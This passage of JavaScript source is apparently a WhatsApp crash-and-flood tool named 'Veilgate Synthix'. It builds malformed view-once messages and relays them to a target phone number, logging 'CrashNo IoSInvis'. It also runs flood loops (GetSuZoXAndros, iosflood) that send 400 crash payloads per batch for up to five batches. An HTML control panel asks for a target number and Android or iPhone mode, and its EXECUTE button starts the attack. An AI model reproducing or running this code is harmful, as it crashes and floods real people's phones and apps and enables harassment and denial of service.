8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      
      let msg1 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let msg2 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      for (const msg of [msg1, msg2]) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
     }
   console.log(chalk.red.bold("─────「 ⏤!CrashNo IoSInvis!⏤ 」─────"))
   } catch (err) {
      console.error(err);
   }
};

async function GetSuZoXAndros(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          VtxForceDelMsg2(X),
          NewProtocolbug6(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Andros 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosinVisFC(X),
          NewProtocolbug6(X),
          VtxForceDelMsg2(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-SILENT 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Veilgate Synthix | Bugs</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{
      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
      color:#fff;
      overflow:hidden;
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background:radial-gradient(circle at 20% 30%,#2a0079 0%,#0c0125 45%,#060013 100%);
    }

    #particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;}

    .container{
      background:rgba(25,15,55,0.6);
      backdrop-filter:blur(10px);
      border-radius:20px;
      padding:28px 22px;
      width:90%;
      max-width:360px; /* lebih kecil */
      box-shadow:0 0 30px rgba(150,100,255,0.3);
      border:1px solid rgba(160,120,255,0.25);
      text-align:center;
      position:relative;
      animation:fadeIn .9s ease;
    }

    @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}

    /* corner neon kecil */
    .corner-line{position:absolute;width:16px;height:16px;border:2px solid #c084fc;opacity:.85;animation:pulseBorder 3s infinite ease-in-out;}
    .corner-tl{top:7px;left:7px;border-right:none;border-bottom:none;border-radius:6px 0 0 0;}
    .corner-tr{top:7px;right:7px;border-left:none;border-bottom:none;border-radius:0 6px 0 0;}
    .corner-bl{bottom:7px;left:7px;border-right:none;border-top:none;border-radius:0 0 0 6px;}
    .corner-br{bottom:7px;right:7px;border-left:none;border-top:none;border-radius:0 0 6px 0;}

    @keyframes pulseBorder{
      0%,100%{opacity:.6;transform:scale(1);}
      50%{opacity:1;transform:scale(1.1);}
    }

    .logo-container{display:flex;flex-direction:column;align-items:center;margin-bottom:20px;}
    .logo{
      width:85px;height:85px;border-radius:50%;
      background:radial-gradient(circle at 35% 35%,#210046 0%,#000 100%);
      display:flex;justify-content:center;align-items:center;
      overflow:hidden;border:2px solid rgba(150,100,255,0.5);
      box-shadow:0 0 25px rgba(120,60,255,0.6),inset 0 0 20px rgba(150,100,255,0.2);
      position:relative;
    }
    .logo::after{
      content:"";position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;border-radius:50%;
      border:1px solid rgba(190,120,255,0.5);animation:pulseBorder 2.8s infinite ease-in-out;
    }
    .logo img{width:100%;height:100%;object-fit:cover;}

    h1{
      text-align:center;
      background:linear-gradient(90deg,#c084fc 0%,#8b5cf6 100%);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
      font-size:23px;font-weight:700;margin-bottom:6px;
    }
    .subtitle{color:#c2b5e9;font-size:13px;margin-bottom:20px;}

    input[type=text]{
      width:100%;padding:11px;border-radius:10px;
      background:rgba(10,5,25,0.9);
      border:2px solid rgba(139,92,246,0.35);
      color:#e5e7eb;font-size:14px;margin-bottom:12px;
      transition:border-color .3s,box-shadow .3s;
    }
    input:focus{border-color:rgba(180,120,255,0.8);box-shadow:0 0 12px rgba(120,60,255,0.4);outline:none;}

    .mode-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:16px;}
    .mode-card{
      background:rgba(20,10,35,0.8);
      border:2px solid rgba(139,92,246,0.35);
      border-radius:12px;
      color:#e2e8f0;padding:10px;
      font-size:12px;font-weight:600;text-transform:uppercase;
      cursor:pointer;transition:all .25s;
      display:flex;align-items:center;justify-content:center;gap:6px;
      position:relative;
    }
    .mode-card::before,.mode-card::after{
      content:"";position:absolute;width:9px;height:9px;border:1.5px solid #c084fc;opacity:.8;animation:pulseBorder 3.2s infinite ease-in-out;
    }
    .mode-card::before{top:4px;left:4px;border-right:none;border-bottom:none;}
    .mode-card::after{bottom:4px;right:4px;border-left:none;border-top:none;}
    .mode-card:hover{border-color:rgba(160,100,255,0.7);background:rgba(35,15,60,1);box-shadow:0 0 8px rgba(150,90,255,0.3);}
    .mode-card.active{border-color:#c084fc;background:rgba(150,90,255,0.2);box-shadow:0 0 15px rgba(150,90,255,0.45);color:#c084fc;}

    .btn{width:100%;padding:12px;border-radius:10px;border:none;font-size:15px;font-weight:600;
      cursor:pointer;transition:transform .2s,box-shadow .2s;
      display:flex;align-items:center;justify-content:center;gap:8px;
      text-transform:uppercase;letter-spacing:.3px;margin-bottom:9px;}
    .btn i{font-size:15px;}
    .btn-exec{
      background:linear-gradient(90deg,#c084fc 0%,#8b5cf6 100%);
      color:#fff;position:relative;
    }
    .btn-exec:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 4px 15px rgba(120,60,255,0.5);}
    .btn-exec:disabled{opacity:.5;cursor:not-allowed;background:rgba(30,15,50,0.6);}

    .footer-action-container{
      display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:8px;margin-top:15px;
    }
    .footer-button{
      background:transparent;border:1.5px solid rgba(139,92,246,0.5);
      color:#c084fc;padding:7px 14px;border-radius:10px;
      font-size:12px;cursor:pointer;transition:all .2s;
      display:flex;align-items:center;gap:6px;font-weight:500;position:relative;
    }
    .footer-button::before,.footer-button::after{
      content:"";position:absolute;width:9px;height:9px;border:1.5px solid #c084fc;animation:pulseBorder 3s infinite ease-in-out;
    }
    .footer-button::before{top:4px;left:4px;border-right:none;border-bottom:none;}
    .footer-button::after{bottom:4px;right:4px;border-left:none;border-top:none;}
    .footer-button:hover{background:rgba(160,100,255,0.15);border-color:rgba(160,100,255,0.8);box-shadow:0 0 8px rgba(150,100,255,0.3);}
    .footer-button a{color:#c084fc;text-decoration:none;display:flex;align-items:center;gap:5px;}
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="container">
    <span class="corner-line corner-tl"></span>
    <span class="corner-line corner-tr"></span>
    <span class="corner-line corner-bl"></span>
    <span class="corner-line corner-br"></span>

    <div class="logo-container">
      <div class="logo">
        <img src="https://res.cloudinary.com/shaa/image/upload/v1757339222/shaastore/o35g1v4so0tnczirobmz.jpg" alt="Logo">
      </div>
    </div>

    <h1>Veilgate Synthix</h1>
    <p class="subtitle">Synthetic Gateway Beyond the Shadows</p>

    <input type="text" id="numberInput" placeholder="Target Number Here 62xxx" />

    <div class="mode-grid">
      <div class="mode-card" id="modeAndro" data-value="andros">
        <i class="fas fa-users"></i> V-SYNTHIX ANDRO
      </div>
      <div class="mode-card" id="modeIphone" data-value="ios">
        <i class="fas fa-mobile-alt"></i> V-SYNTHIX IPHONE
      </div>
    </div>

    <button class="btn btn-exec" id="executeBtn" disabled>
      <i class="fas fa-paper-plane"></i> EXECUTE
    </button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/nazarickspy" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Unknown'}
        <span style="color:#ff4444; font-weight:bold;">&nbsp;•&nbsp;</span>
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <!-- Particles.js -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      particleground(document.getElementById('particles'), {
        dotColor:'#c084fc',
        lineColor:'#8b5cf6',
        minSpeedX:0.1,maxSpeedX:0.3,
        minSpeedY:0.1,maxSpeedY:0.3,
        density:12000,particleRadius:3,
      });
    }, false);

    const inputField=document.getElementById('numberInput');
    const executeBtn=document.getElementById('executeBtn');
    let selectedMode=null;

    function isValidNumber(number){
      const pattern=/^\\+?\\d{7,20}$/;
      return pattern.test(number);
    }
    function toggleButton(){
      const number=inputField.value.trim().replace(/\\s+/g,'');
      executeBtn.disabled=!(isValidNumber(number)&&selectedMode);
    }
    function selectMode(modeCard){
      document.querySelectorAll('.mode-card').forEach(c=>c.classList.remove('active'));
      modeCard.classList.add('active');
      selectedMode=modeCard.dataset.value;
      toggleButton();
    }
    document.querySelectorAll('.mode-card').forEach(c=>c.addEventListener('click',()=>selectMode(c)));
    inputField.addEventListener('input',toggleButton);
    executeBtn.addEventListener('click',()=>{
      const number=inputField.value.trim().replace(/\\s+/g,'');
      window.location.href='/execution?mode='+selectedMode+'&target='+encodeURIComponent(number);
    });
    toggleButton();
  </script>
</body>
</html>`;
};